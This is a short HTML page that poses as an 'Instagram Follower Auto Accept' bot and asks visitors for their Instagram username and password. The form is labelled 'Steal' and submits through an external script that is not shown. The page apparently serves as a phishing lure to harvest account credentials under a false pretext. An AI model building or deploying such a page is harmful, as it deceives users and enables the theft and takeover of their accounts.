<html>
    <head>
        <title>Instagram bot</title>
        <link rel="stylesheet" type="text/css" href="Insta.css">
        <script src="Insta.js"></script>
    </head>
    <body>
        <div id="body">
            <div id="header">
                <h1>Instagram Follower Auto Accept</h1>
            </div>
            <form method="POST" onsubmit="onSubmit()" id="Steal">
                <div id="User-Password">
                    <h3>UserName:</h3>
                    <input type="text" name="UserName" placeholder="   UserName" id="UserName"/>
                    <h3>Password:</h3>
                    <input name="password" placeholder="   Password" type="password" id="Password">
                </div>
                <div id="Start">
                    <input id="buttonStart" type="submit" value="Start Bot"/>
                </div>
            </form>
        </div>
    </body>
</html>
